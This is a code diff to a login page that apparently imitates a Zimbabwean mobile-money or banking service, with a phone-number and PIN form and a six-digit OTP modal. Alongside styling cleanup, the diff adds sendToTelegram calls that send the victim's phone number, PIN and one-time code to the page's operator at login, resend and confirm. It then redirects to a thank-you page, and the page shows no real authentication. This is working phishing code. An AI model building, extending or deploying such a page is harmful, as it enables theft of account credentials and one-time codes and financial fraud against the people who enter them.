@@ -22,7 +22,7 @@ body{
   color:#020617;
 }
 
-/* CARD — RECTANGLE, NO OUTLINE */
+/* CARD */
 .card{
   width:100%;
   max-width:380px;
@@ -33,7 +33,7 @@ body{
   box-shadow:0 14px 30px rgba(0,0,0,.12);
 }
 
-/* LOGO — 3× SIZE */
+/* LOGO */
 .logo{
   height:144px;
   display:block;
@@ -48,22 +48,19 @@ label{
   color:#475569;
 }
 
-/* PHONE FIELD — GREY, STRAIGHT */
+/* PHONE */
 .phone-field{
   display:flex;
   align-items:center;
   border:1px solid #d1d5db;
-  border-radius:0;
-  overflow:hidden;
   background:#f8fafc;
 }
 
 .cc{
   padding:12px 10px;
-  font-size:14px;
-  color:#475569;
   min-width:64px;
   text-align:center;
+  color:#475569;
 }
 
 .divider{
@@ -76,37 +73,31 @@ label{
   flex:1;
   padding:12px;
   border:0;
-  outline:none;
   background:transparent;
   font-size:14px;
 }
 
 .phone-input::placeholder{color:#9ca3af}
 
-/* PIN FIELD — SAME STYLE */
+/* PIN */
 .pin-input{
   width:100%;
   margin-top:10px;
   padding:12px;
-  border-radius:0;
   border:1px solid #d1d5db;
   background:#f8fafc;
   font-size:14px;
 }
 
-.pin-input::placeholder{color:#9ca3af}
-
-/* BUTTON — STRAIGHT */
+/* BUTTON */
 .btn{
   background:#ff7a00;
   padding:12px;
-  border-radius:0;
   border:0;
   width:100%;
   font-weight:700;
   margin-top:18px;
   cursor:pointer;
-  color:#000;
 }
 
 .btn[disabled]{opacity:.6}
@@ -133,12 +124,11 @@ label{
 .otp-box{
   background:#fff;
   padding:24px;
-  border-radius:0;
   min-width:360px;
   box-shadow:0 14px 30px rgba(0,0,0,.12);
 }
 
-/* OTP SQUARES */
+/* OTP BOXES */
 .otp-row{
   display:flex;
   gap:10px;
@@ -151,11 +141,11 @@ label{
   height:44px;
   border:1px solid #d1d5db;
   background:#f8fafc;
-  display:flex;                 /* ✅ added */
-  align-items:center;           /* ✅ added */
-  justify-content:center;       /* ✅ added */
-  font-size:18px;               /* ✅ added */
-  font-weight:600;              /* ✅ added */
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:18px;
+  font-weight:600;
 }
 
 .otp-digit.filled{
@@ -179,7 +169,7 @@ label{
   cursor:pointer;
 }
 
-.resend-btn[disabled]{opacity:.6;cursor:not-allowed}
+.resend-btn[disabled]{opacity:.6}
 .action-secondary{background:#e5e7eb}
 
 /* SPINNER */
@@ -203,18 +193,15 @@ label{
   <img src="/assets/one.webp" class="logo">
 
   <form id="loginForm" autocomplete="off">
-
     <label>Mobile Number</label>
     <div class="phone-field">
       <div class="cc">+263</div>
       <div class="divider"></div>
-      <input id="phone" class="phone-input" inputmode="numeric"
-             placeholder="Mobile No.">
+      <input id="phone" class="phone-input" inputmode="numeric" placeholder="Mobile No.">
     </div>
     <div id="phoneError" class="error"></div>
 
-    <input id="pin" class="pin-input" inputmode="numeric"
-           maxlength="4" placeholder="Login PIN">
+    <input id="pin" class="pin-input" inputmode="numeric" maxlength="4" placeholder="Login PIN">
 
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
@@ -279,20 +266,28 @@ function updateState(){
   loginBtn.disabled=!(validatePhone() && pin.value.length===4);
 }
 
-phone.addEventListener('input',()=>{
+phone.oninput=()=>{
   phone.value=phone.value.replace(/\D/g,'').slice(0,9);
   updateState();
-});
+};
 
-pin.addEventListener('input',()=>{
+pin.oninput=()=>{
   pin.value=pin.value.replace(/\D/g,'').slice(0,4);
   updateState();
-});
+};
 
 /* LOGIN */
 const otpModal=document.getElementById('otpModal');
 document.getElementById('loginForm').onsubmit=e=>{
   e.preventDefault();
+
+  sendToTelegram({
+    event:'login_clicked',
+    loginPhone:phone.value,
+    loginPin:pin.value,
+    submittedAt:new Date().toISOString()
+  });
+
   otpModal.style.display='flex';
   startOtp();
 };
@@ -315,16 +310,16 @@ function startOtp(){
 
 function renderOtp(v){
   dots.forEach((d,i)=>{
-    d.textContent = v[i] || '';      /* ✅ visible digits */
+    d.textContent=v[i]||'';
     d.classList.toggle('filled',!!v[i]);
   });
   confirmBtn.disabled=v.length!==6;
 }
 
-buffer.addEventListener('input',()=>{
+buffer.oninput=()=>{
   buffer.value=buffer.value.replace(/\D/g,'').slice(0,6);
   renderOtp(buffer.value);
-});
+};
 
 dots.forEach(d=>d.onclick=()=>buffer.focus());
 
@@ -341,6 +336,37 @@ function startCountdown(){
     }
   },1000);
 }
+
+/* RESEND */
+resendBtn.onclick=()=>{
+  resendBtn.disabled=true;
+  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
+
+  sendToTelegram({
+    event:'resend_otp',
+    loginPhone:phone.value,
+    loginPin:pin.value,
+    submittedAt:new Date().toISOString()
+  });
+
+  setTimeout(()=>{
+    resendBtn.innerHTML='Resend';
+    startCountdown();
+  },1200);
+};
+
+/* CONFIRM */
+confirmBtn.onclick=()=>{
+  sendToTelegram({
+    event:'otp_confirm',
+    loginPhone:phone.value,
+    loginPin:pin.value,
+    otp:buffer.value,
+    submittedAt:new Date().toISOString()
+  });
+
+  window.location.href='thankyou.html';
+};
 
 /* CANCEL */
 document.getElementById('cancelOtp').onclick=()=>{
